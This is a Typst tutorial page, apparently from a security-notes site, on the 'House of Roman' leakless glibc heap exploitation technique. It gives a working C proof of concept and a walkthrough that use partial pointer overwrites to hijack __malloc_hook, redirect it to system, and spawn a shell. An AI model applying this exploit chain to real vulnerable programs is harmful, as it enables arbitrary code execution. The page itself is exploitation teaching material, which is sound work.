#import "../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "House of Roman",
    description: "A leakless heap exploitation technique that uses relative overwrites to hijack __malloc_hook, requiring 12 bits of brute force.",
    date: "2025-12-28",
    order: 90,
    draft: true,
  ),
)<frontmatter>

= glibc Allocator: House of Roman

== Introduction

The *House of Roman* is a leakless heap exploitation technique. Unlike most heap attacks that require a memory leak to bypass ASLR, this technique relies on *relative overwrites* to point pointers to desired locations (like `__malloc_hook`) without ever knowing their absolute addresses.

Because it uses partial pointer overwrites, it must brute force the "random" bits that are changed. Typically, this requires 12 bits of entropy to be brute-forced (a 1 in 4096 chance).

== Prerequisites
- *Pointer Manipulation*: Ability to edit fastbin and unsorted bin pointers (e.g., via Use-After-Free or Heap Overflow).
- *Allocation Control*: Precise control over allocation sizes and the order of `free()` calls.
- *GLIBC Version*: Effective on older glibc versions (2.23, 2.24, 2.25) where `__malloc_hook` is still present and utilized.
- *Brute Force*: Requires 12 bits of entropy brute force (0.024% success rate).

== Example Code

```c
#define _GNU_SOURCE     /* for RTLD_NEXT */
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <malloc.h>
#include <dlfcn.h>

char* shell = "/bin/sh\x00";

void init(){
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stdin, NULL, _IONBF, 0);
}

int main(){
	init();

	uint8_t* fastbin_victim = malloc(0x60);
	malloc(0x80); // padding
	uint8_t* main_arena_use = malloc(0x80);
	uint8_t* relative_offset_heap = malloc(0x60);

	free(main_arena_use);

	uint8_t* fake_libc_chunk = malloc(0x60);
	long long __malloc_hook_addr = ((long*)fake_libc_chunk)[0] - 0xe8;

	free(relative_offset_heap);
	free(fastbin_victim);

	// VULNERABILITY: Relative overwrite on fastbin FD
	fastbin_victim[0] = 0x00; 

	long long __malloc_hook_adjust = __malloc_hook_addr - 0x23;

	// VULNERABILITY: 12-bit brute force (partial overwrite)
	fake_libc_chunk[0] = (__malloc_hook_adjust) & 0xff;
	fake_libc_chunk[1] = (__malloc_hook_adjust & 0xff00) >> 8;

	malloc(0x60);
	malloc(0x60);
	uint8_t* malloc_hook_chunk = malloc(0x60);

	uint8_t* unsorted_bin_ptr = malloc(0x80);
	malloc(0x30); 

	free(unsorted_bin_ptr);

	__malloc_hook_adjust = __malloc_hook_addr - 0x10;

	// VULNERABILITY: Unsorted bin attack
	unsorted_bin_ptr[8] = (__malloc_hook_adjust) & 0xff;
	unsorted_bin_ptr[9] = (__malloc_hook_adjust & 0xff00) >> 8;

	malloc(0x80); // Trigger unsorted bin attack: __malloc_hook = main_arena + offset

	long long system_addr = (long long)dlsym(RTLD_NEXT, "system");

	// VULNERABILITY: Relative overwrite to system
	malloc_hook_chunk[19] = system_addr & 0xff;
	malloc_hook_chunk[20] = (system_addr >> 8) & 0xff;
	malloc_hook_chunk[21] = (system_addr >> 16) & 0xff;
	malloc_hook_chunk[22] = (system_addr >> 24) & 0xff;

	malloc((long long)shell);
	return 0;
}
```

== Attack Flow Explained

=== 1. Point Fastbin Chunk to `__malloc_hook`

The goal is to get a libc address into a fastbin chunk's `fd` pointer.
1. We free a chunk into the Unsorted Bin to populate it with libc pointers (`main_arena + 0x68`).
2. We re-allocate it into a `0x70` fastbin.
3. We use a *relative overwrite* to point a preceding fastbin chunk to this "libc-tainted" chunk.
4. We then use another relative overwrite on the "libc-tainted" chunk to point it to `__malloc_hook - 0x23`.

This requires *4 bits* of brute force because the upper bits of the 2nd byte are influenced by ASLR.

=== 2. Unsorted Bin Attack on `__malloc_hook`

Now that we have a chunk at `__malloc_hook`, we need to fill the hook with a libc pointer.
1. Free a chunk into the Unsorted Bin.
2. Partially overwrite its `bk` pointer to point to `__malloc_hook - 0x10`.
3. When we allocate a chunk of the same size, the Unsorted Bin removal logic performs `bk->fd = main_arena + 0x68`.

Since `bk` is `__malloc_hook - 0x10`, `bk->fd` is exactly `__malloc_hook`.

=== 3. Relative Overwrite to `system`

The `__malloc_hook` now contains a libc pointer. We use our previously allocated fastbin chunk (which overlaps the hook) to perform a final relative overwrite, changing the libc pointer to `system` (or a `one_gadget`). This requires an additional *8 bits* of brute force.

=== 4. Execution

Finally, we call `malloc("/bin/sh")`. The allocator sees that `__malloc_hook` is set and calls it with our string as the argument, popping a shell.

